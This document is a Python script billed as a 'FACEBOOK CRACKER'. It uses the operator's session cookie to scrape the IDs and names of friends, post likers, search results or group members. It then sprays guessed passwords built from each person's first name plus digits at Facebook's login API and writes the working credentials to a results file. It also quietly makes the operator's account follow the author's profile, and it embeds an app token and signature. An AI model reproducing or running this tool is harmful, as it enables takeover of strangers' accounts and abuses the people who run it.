#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# coded by zettamus

import os
import re 
import json
import requests
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor
mbasic = 'https://mbasic.facebook.com{}'
id = []
idx = []
idsearch = []
grupsearch = []
global die,check,result
die = 0
check = 0 
result = 0
def masuk():
        print("\n\n\t[ LOGIN YOUR FACEBOOK ]\n")
        print("> how to get cookie : \n  https://m.facebook.com/story.php?story_fbid=240261960743816&id=100042800416881 ")
        try:
                cek = open("cookies").read()
        except FileNotFoundError:
                cek = input("# enter your cookies : ")
        cek = {"cookie":cek}
        ismi = ses.get(mbasic.format("/me"),cookies=cek).content
        if "mbasic_logout_button" in str(ismi):
                if "Lihat Berita Lain" in str(ismi):
                        with open("cookies","w") as f:
                                f.write(cek["cookie"])
                else:
                        print("# Change the language, please wait!!")
                        requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
                try:
                        # please don't remove this or change
                        ikuti = parser(requests.get(mbasic.format("/zettamus.zettamus.3"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                        ses.get(mbasic.format(ikuti),cookies=cek)
                except :
                        pass 
                return cek["cookie"]
        else:
                 exit("# cookies wrong")
def login(username,password):
        global die,check,result
        params = {
                'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                'format': 'JSON',
                'sdk_version': '2',
                'email': username,
                'locale': 'en_US',
                'password': password,
                'sdk': 'ios',
                'generate_session_cookies': '1',
                'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
        }
        api = 'https://b-api.facebook.com/method/auth.login'
        response = requests.get(api, params=params)
        if 'EAAA' in response.text:
                result += 1
                with open('results-life.txt','a') as f:
                        f.write(username + '|' + password + '\n')
        elif 'www.facebook.com' in response.json()['error_msg']:
                check += 1
                with open('results-check.txt','a') as f:
                        f.write(username + '|' + password + '\n')
        else:
                die += 1
        print(f"\r# results : life : ({str(result)}) checkpoint : ({str(check)}) die : ({str(die)})",end="")
def getid(url):
        raw = requests.get(url,cookies=kuki).content
        getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))
        for x in getuser:
                if 'profile' in x[0]:
                        id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
                elif 'friends' in x:
                        continue
                else:
                        id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
                print('\r # ' + str(len(id)) + " retrieved",end="")
        if 'Lihat Teman Lain' in str(raw):
                getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
        return id
def fromlikes(url):
        like = requests.get(url,cookies=kuki).content
        love = re.findall('href="(/ufi.*?)"',str(like))[0]
        aws = getlike(mbasic.format(love))
        return aws
def getlike(react):
        like = requests.get(react,cookies=kuki).content
        ids  = re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
        for user in ids:
                if 'profile' in user[0]:
                        idx.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                else:
                        idx.append(user[1] + "|" + user[0].split('/')[1])
                print(f'\r# {str(len(idx))} retrieved',end="")
        if 'Lihat Selengkapnya' in str(like):
                getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
        return idx
def bysearch(option):
        search = requests.get(option,cookies=kuki).content
        users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>',str(search))
        for user in users:
                if "profile" in user[0]:
                        idsearch.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                else:
                        idsearch.append(user[1] + "|" + user[0].split("?")[0])
                print(f"\r# {str(len(idsearch))} retrieved ",end="")
        if "Lihat Hasil Selanjutnya" in str(search):
                bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
        return idsearch
def grubid(endpoint):
        grab = requests.get(endpoint,cookies=kuki).content
        users = re.findall('a class=".." href="/(.*?)">(.*?)</a>',str(grab))
        for user in users:
                if "profile" in user[0]:
                        grupsearch.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
                else:
                        grupsearch.append(user[1] + "|" + user[0])
                print(f"\r# {str(len(grupsearch))} retrieved ",end="")
        if "Lihat Selengkapnya" in str(grab):
                grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
        return grupsearch
if __name__ == '__main__':
        try:
                ses = requests.Session()
                kukis = masuk()
                kuki = {'cookie':kukis}
                os.system("clear")
                print('\n\n\t[ FACEBOOK CRACKER ]\n')
                print('1 List friends')
                print('2 From likes ')
                print('3 By search name ')
                print('4 From group ')
                print()
                tanya = input('# Get id from : ')
                
                if tanya == '1':
                        url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
                        username = getid(mbasic.format(url["href"]))
                elif tanya == '2':
                        username = input("# url : ")
                        if username == "":
                                exit("# Dont be empty")
                        elif 'www.facebook' in username:
                               username = username.replace('www.facebook','mbasic.facebook')
                        elif 'm.facebook.com' in username:
                               username = username.replace('m.facebook.com','mbasic.facebook.com')
                        username = fromlikes(username) 
                elif tanya == '3':
                        zet = input("# query : ")
                        username = bysearch(mbasic.format('/search/people/?q='+zet))
                        if len(username) == 0:
                                exit("# no result")
                elif tanya == '4':
                        print("# can only take 100 IDs ")
                        grab = input("# ID group : ")
                        username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                        if len(username) == 0:
                                exit("# ID wrong")
                print()
                expass = input("# extra password : ")
                print("# result will be saved in results-life and results-life")
                with ThreadPoolExecutor(max_workers=8) as ex:
                        for user in username:
                                users = user.split('|')
                                ss = users[0].split(' ')
                                for x in ss:
                                        listpass = [
                                                str(x) + '123',
                                                str(x) + '12345',
                                                str(x) + '123456',
                                                expass
                                                ]
                                        for passw in listpass:
                        #login(user,'sayang')
                                                ex.submit(login,(users[1]),(passw))
                print("\n# Done. file saved in : ")
                print("        - life : results-life")
                print("        - checkpoint : results-check")
                exit("# thanks for using this tools")
        except (KeyboardInterrupt,EOFError):
                exit()
